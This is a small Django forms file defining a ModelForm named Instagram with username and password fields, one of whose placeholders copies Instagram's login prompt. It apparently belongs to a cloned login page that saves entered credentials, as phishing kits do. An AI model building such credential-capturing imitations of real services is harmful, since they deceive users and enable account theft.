from django import forms
from .models import *
from django.forms import TextInput

class Instagram(forms.ModelForm):
    class Meta:
        model = Instagram
        fields = ('username', 'password')
        widgets = {
            'username': TextInput(attrs={'placeholder': 'Phone number, username, email'}),
            'password': TextInput(attrs={'placeholder': 'Password'})
        }
        